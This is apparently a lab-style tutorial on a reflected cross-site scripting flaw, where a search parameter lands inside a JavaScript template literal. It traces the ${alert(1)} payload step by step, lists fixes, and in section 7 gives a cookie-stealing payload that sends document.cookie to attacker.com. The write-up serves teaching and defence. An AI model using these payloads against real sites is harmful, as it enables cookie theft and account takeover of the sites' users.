Deep Dive: Template Literal Injection (XSS)

1. Your Payload

GET /?search=${alert(1)}

You sent search=${alert(1)} as a query parameter. The name is search and the value is ${alert(1)}.

${} is JavaScript template string interpolation — meaning inside backticks (`), anything inside ${} is evaluated as code.

2. How it Reflected

<script>
    var message = `0 search results for '${alert(1)}'`;
    document.getElementById('searchMessage').innerText = message;
</script>

Your input ${alert(1)} was reflected inside a JavaScript template literal within a <script> block.

3. Why Your Payload Worked

In template strings, anything inside ${} gets executed. So ${alert(1)} immediately called alert(1) when the page loaded.

4. Real Flow in the Browser

  • Page loads
  • Browser executes the <script>
  • Template string `0 search results for '${alert(1)}'` is parsed
  • alert(1) is called immediately
  • Alert pops up!

5. What Made it Vulnerable?

  • User input was directly inserted into a template literal inside JavaScript.
  • No escaping or sanitization was done.

6. How Developers Should Prevent It

  • Escape any ${ in user input before inserting into template literals (e.g., replace with \${).
  • Don't dynamically generate JavaScript with unsanitized user data.
  • Prefer inserting user input as plain text into HTML DOM elements, not into JavaScript code.

7. Why is This Dangerous?

Instead of alert(1), an attacker could inject: 

${fetch('https://attacker.com/steal?cookie='+document.cookie)}

This could:

  • Steal cookies
  • Steal sensitive data
  • Perform account takeover

8. Step-by-Step Summary

Step What Happened
1 Sent search=${alert(1)} as GET request
2 Server reflected it into a JavaScript template literal
3 Browser parsed and executed ${alert(1)}
4 JavaScript engine called alert(1)
5 Alert box popped up!

🧠 Final Hacker Concept to Remember

In JavaScript template literals, anything inside ${} will execute as code, not just be printed.
Always review user input being reflected inside backtick ` contexts.
